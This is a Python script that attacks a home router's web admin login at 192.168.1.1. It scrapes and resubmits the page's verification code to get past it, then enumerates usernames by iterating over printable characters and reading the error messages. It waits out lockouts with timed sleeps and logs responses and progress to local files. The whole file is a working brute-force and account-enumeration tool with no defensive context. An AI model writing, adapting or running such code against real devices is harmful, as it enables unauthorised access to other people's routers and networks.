import requests
import time
def getNewCode():
    url = 'http://192.168.1.1/admin/login.asp'
    x = requests.get(url).text
    start = x.find("mentById('check_code').value='")
    code = x[start+30:start+35]
    return code


def tryPass(u,p):
    import requests
    url = 'http://192.168.1.1/boaform/admin/formLogin'
    myobj = {"username1":u,"username":u,"psd1":p,"psd":p,"verification_code":getNewCode(),"sec_lang":"0","ismobile":""}


    x = requests.post(url, data = myobj)
    resp = x.text
    if resp.find("thrice") > 0:
        return "wait"
    if resp.find("automatically") > 0:
        return "wait"
    if resp.find("invalid username") > 0:
        return "newUser"
    if resp.find("password") > 0:
        return resp + str(myobj) + "<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>"
    return "blank"

def newUser(theuser):
    print("getting a new string")
    print(theuser)
    return ''.join([theuser[i] for i in range(len(theuser))  ])




import string
ALLOWED_CHARACTERS = string.printable
NUMBER_OF_CHARACTERS = len(ALLOWED_CHARACTERS)

def characterToIndex(char):
    return ALLOWED_CHARACTERS.index(char)

def indexToCharacter(index):
    if NUMBER_OF_CHARACTERS <= index:
        raise ValueError("Index out of range.")
    else:
        return ALLOWED_CHARACTERS[index]

def next(string):
    """ Get next sequence of characters.
    Treats characters as numbers (0-255). Function tries to increment
    character at the first position. If it fails, new character is
    added to the back of the list.
    It's basically a number with base = 256.
    :param string: A list of characters (can be empty).
    :type string: list
    :return: Next list of characters in the sequence
    :rettype: list
    """
    if len(string) <= 0:
        string.append(indexToCharacter(0))
    else:
        string[0] = indexToCharacter((characterToIndex(string[0]) + 1) % NUMBER_OF_CHARACTERS)
        if characterToIndex(string[0]) is 0:
            return list(string[0]) + next(string[1:])
    return string


        
        



muser = ""
sequence = list()
try :
    fb = open("passformproggress.txt", "r")
    sequence = list(fb.read())
    print("Last Attempt was :- ")
    print(sequence)
except:
    muser = "a"
    sequence = ['a']
while True:
    print("Now Trying :- ")
    print(muser)
    stat = tryPass(muser,"pasasds")
    print("Status of the server :- " + stat)
    if stat == "wait":
        print("Sleeping")
        time.sleep(61)
        continue
    if stat == "newUser":
        sequence = next(sequence)
        muser = newUser(sequence)
        fa = open("passformproggress.txt", "w")
        fa.write(muser)
        fa.close()
        print("Now Trying :- ")
        print (muser)
        continue
    f = open("passform.txt", "a")
    f.write(stat)
    f.close()